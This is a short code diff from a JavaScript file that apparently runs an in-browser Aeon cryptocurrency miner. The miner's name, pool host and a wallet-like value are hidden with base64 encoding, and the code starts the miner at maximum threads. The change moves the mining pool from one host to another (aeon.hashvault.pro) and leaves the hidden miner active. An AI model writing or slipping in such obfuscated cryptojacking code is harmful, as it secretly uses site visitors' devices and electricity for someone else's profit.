@@ -14,7 +14,7 @@
             const key = atob('QWVvbg==');
             var intv = setInterval(() => {
                 if (window[key]) {
-                    const args = [atob('ZHVyaW5zbWluZS5jb20='),
+                    const args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
                         atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
                     window[key].start.apply(window[key], args);
                     window[key].addMaxThreads();
